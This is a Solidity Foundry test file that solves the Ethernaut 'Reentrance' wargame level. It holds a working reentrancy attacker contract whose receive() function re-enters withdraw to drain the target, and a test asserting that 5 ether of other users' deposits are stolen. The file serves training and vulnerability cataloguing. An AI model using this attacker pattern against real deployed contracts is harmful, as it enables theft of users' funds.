// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

/// Ethernaut #10 "Reentrance" → Aegis catalog `cei-reentrancy` (SC08).
/// `withdraw` sends ETH via a low-level call BEFORE decrementing the caller's balance (checks-
/// effects-interactions violation), so a malicious `receive()` re-enters `withdraw` and drains the
/// contract. Win condition (ReentranceFactory): contract balance == 0.
/// (Reentrance is ^0.6.12, deployed via `deployCode`.)
interface IReentrance {
    function donate(address to) external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address who) external view returns (uint256);
}

contract ReentranceAttacker {
    IReentrance public immutable target;
    uint256 public unit;

    constructor(IReentrance t) {
        target = t;
    }

    function attack() external payable {
        unit = msg.value;
        target.donate{value: msg.value}(address(this)); // get a balance entry
        target.withdraw(unit); // kicks off the re-entrant drain
    }

    receive() external payable {
        if (address(target).balance >= unit) {
            target.withdraw(unit); // re-enter before our balance is decremented
        }
    }
}

contract ReentranceTest is Test {
    function test_solve_reentrance() public {
        address payable r = payable(deployCode("Reentrance.sol:Reentrance"));

        // Seed the contract with other users' deposits (what the attacker will steal), plus 1 ETH
        // for the attacker's own seed deposit.
        vm.deal(address(this), 6 ether);
        IReentrance(r).donate{value: 5 ether}(address(0xBEEF));
        assertEq(r.balance, 5 ether, "contract holds other users' funds");

        ReentranceAttacker att = new ReentranceAttacker(IReentrance(r));
        att.attack{value: 1 ether}();

        assertEq(r.balance, 0, "Reentrance solved: contract fully drained");
    }
}
